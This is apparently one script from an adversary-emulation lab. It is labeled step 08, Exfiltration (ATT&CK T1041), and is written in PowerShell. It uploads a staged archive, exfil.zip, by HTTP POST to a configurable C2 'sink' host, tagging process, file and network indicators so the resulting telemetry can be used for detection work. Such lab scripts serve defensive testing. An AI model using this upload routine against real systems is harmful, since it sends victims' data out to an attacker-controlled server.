<#
  08 — EXFILTRATION  (tactic: Exfiltration)
  Technique: T1041 (exfil over C2 channel) — ship the archive from 07 to the sink.
  Observable nodes: file READ (the archive) + network edge (to the same sink as the C2).
  Reusing the C2 endpoint ties exfil to the C2 node — a realistic, detectable linkage.
  Admin required: no.
#>
. "$PSScriptRoot\..\lib\attack-lib.ps1"
Initialize-AttackLab

$SinkHost = if ($env:C2_SINK_HOST) { $env:C2_SINK_HOST } else { "10.21.2.10" }
$SinkPort = if ($env:C2_SINK_PORT) { [int]$env:C2_SINK_PORT } else { 8888 }
$archive  = "C:\Users\Public\exfil.zip"

Invoke-LabeledStep -Technique "T1041" -Tactic "exfiltration" `
    -ProcessIndicators @("powershell.exe") `
    -FileIndicators @($archive) `
    -NetworkIndicators @("${SinkHost}:${SinkPort}") `
    -Note "Exfiltrate archive over web to C2 sink" -Action {
        if (-not (Test-Path $archive)) { Write-Warning "no archive — run 07 first"; return }
        $uri = "http://$($SinkHost):$($SinkPort)/upload"
        try { Invoke-WebRequest -Uri $uri -Method Post -InFile $archive -UseBasicParsing -TimeoutSec 10 | Out-Null }
        catch { Write-Warning "upload failed (sink down?) — connection attempt still generated telemetry" }
    }
